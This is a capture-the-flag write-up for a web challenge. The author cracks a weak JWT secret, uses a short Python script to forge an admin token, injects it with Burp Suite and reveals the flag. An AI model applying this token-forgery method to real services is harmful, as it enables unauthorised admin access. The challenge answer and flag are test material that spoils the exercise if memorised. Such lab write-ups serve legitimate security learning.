## This one was quite comfortable, though for a while I did mistakenly write "name" instead of "username" as a parameter in the payload. Silly me.

When I got on the page, I immediately recognised the token on the page as a JWT token. I have a bit of experience with JWT tokens from previous CTF problems, so my first instinct was to put it through a [website](https://jwt-cracker.online/) to crack it. 

![image](https://github.com/user-attachments/assets/98d16789-f37c-4140-b9ee-eed560072126)

That is a very strong secret key! /s

I then constructed a script to generate a forged JWT token using the key I cracked and replacing "user" with "admin" in the username parameter. 
```python
import jwt
import datetime

secret_key = "1234"

payload = {
    "username": "admin",
    "exp": "1738458124"
}

# Encode the JWT
token = jwt.encode(payload, secret_key, algorithm="HS256")

print("Generated JWT:", token)
```
![image](https://github.com/user-attachments/assets/1669de00-bfc5-4e5b-bb4f-340eb88c4560)


I opened up burp suite and turned on intercept, then I replaced the original token in the request with my forged one.

![image](https://github.com/user-attachments/assets/550f5004-f816-4478-a06b-05fd918e1081)

After a few server hiccups on the organiser's end, I got in.

![image](https://github.com/user-attachments/assets/27e5e52c-246f-4a68-96e9-abe3b327a5fd)


```
ectf{JwT_T0keN_cR34t0r}
```
